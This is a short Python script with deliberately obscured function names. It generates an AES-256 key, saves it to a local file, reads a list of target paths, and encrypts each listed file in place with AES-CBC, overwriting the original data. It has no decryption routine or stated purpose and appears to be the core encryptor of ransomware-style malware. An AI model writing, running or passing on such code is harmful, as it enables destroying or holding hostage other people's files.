import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def z91():
    return get_random_bytes(32)

def s2v(k1, p1='a1.bin'):
    with open(p1, 'wb') as f1:
        f1.write(k1)

def j8f(f9, k2):
    try:
        with open(f9, 'rb') as f2:
            d1 = f2.read()

        c1 = AES.new(k2, AES.MODE_CBC)
        e1 = c1.encrypt(pad(d1, AES.block_size))
        iv = c1.iv
        final = iv + e1

        with open(f9, 'wb') as f3:
            f3.write(final)

        print(f"[+] {f9}")
    except Exception as x:
        print(f"[-] {f9}: {x}")

def p5k():
    k = z91()
    s2v(k)

    try:
        with open('f.tmp', 'r') as z:
            l = [i.strip() for i in z if i.strip()]
    except FileNotFoundError:
        print("No list file.")
        return

    for t in l:
        j8f(t, k)

if __name__ == "__main__":
    p5k()
